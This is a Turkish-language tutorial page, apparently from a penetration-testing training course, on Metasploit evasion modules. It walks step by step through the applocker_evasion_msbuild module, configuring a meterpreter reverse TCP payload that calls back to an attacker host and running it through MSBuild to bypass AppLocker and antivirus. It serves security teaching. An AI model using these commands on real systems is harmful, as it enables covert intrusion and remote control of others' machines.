Evasion modülleri, hedef sistemlerdeki güvenlik önlemleri (antivirüs yazılımları, IDS/IPS sistemleri vb.) tarafından tespit edilmeden exploit ve payloadların başarılı bir şekilde yürütülmesini sağlayan stratejileri uygular. Bu modüller, saldırıların fark edilmesini zorlaştıran çeşitli teknikler içerir.

### Evasion Modüllerinin Kullanım Amacı

Evasion modülleri, exploitlerin hazırlanması ve çalıştırılması aşamasında kullanılır. Bir saldırgan, güvenlik önlemlerini atlatmak ve hedef sistemlere mümkün olan en az dikkati çekerek erişmek için bu modülleri kullanır.

### Evasion Modüllerinin Kullanımı

Metasploit'te mevcut evasion modüllerini görmek için msfconsole'da şu komutu kullanabilirsiniz:

```auto
msf6 > show evasion
```

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/12f1e503-f9cf-4ef8-9453-59b4b1f03445/image-8-bc4653ffa.webp)

Bu komut, kullanılabilir tüm evasion modüllerini listeler ve her birinin ne için kullanıldığına dair kısa bir açıklama sağlar.

Örneğin, Windows ortamlarında AppLocker gibi politika tabanlı uygulama kontrol sistemlerini veya antivirüs yazılımlarını atlatmak için aşağıdaki adımlar izlenebilir.

1. Evasion modülünün seçilmesi.

```auto
msf6 > use evasion/windows/applocker_evasion_msbuild
msf6 evasion(windows/applocker_evasion_msbuild) > 
```

2. Payloadın seçilmesi.

```auto
msf6 evasion(windows/applocker_evasion_msbuild) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
```

3. Gerekli ayarların yapılması.

```auto
msf6 evasion(windows/applocker_evasion_msbuild) > set LHOST 172.20.5.144
LHOST => 172.20.5.144
msf6 evasion(windows/applocker_evasion_msbuild) > set LPORT 4444
LPORT => 4444
```

4. Evasion modülünün çalıştırılması

```auto
msf6 evasion(windows/applocker_evasion_msbuild) > run

[+] msbuild.txt stored at /root/.msf4/local/msbuild.txt
[*] Copy msbuild.txt to the target
[*] Execute using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\MSBuild.exe msbuild.txt
```

Bu evasion modülü, MSBuild aracılığıyla AppLocker politikalarını atlayarak kötü amaçlı kodun çalıştırılmasını sağlayan bir payload oluşturur ve gönderir. Eğer hedef sistemde AppLocker politikaları aktifse ve MSBuild güvenilen bir uygulama olarak listelenmişse, bu teknik yüksek bir başarı şansına sahiptir.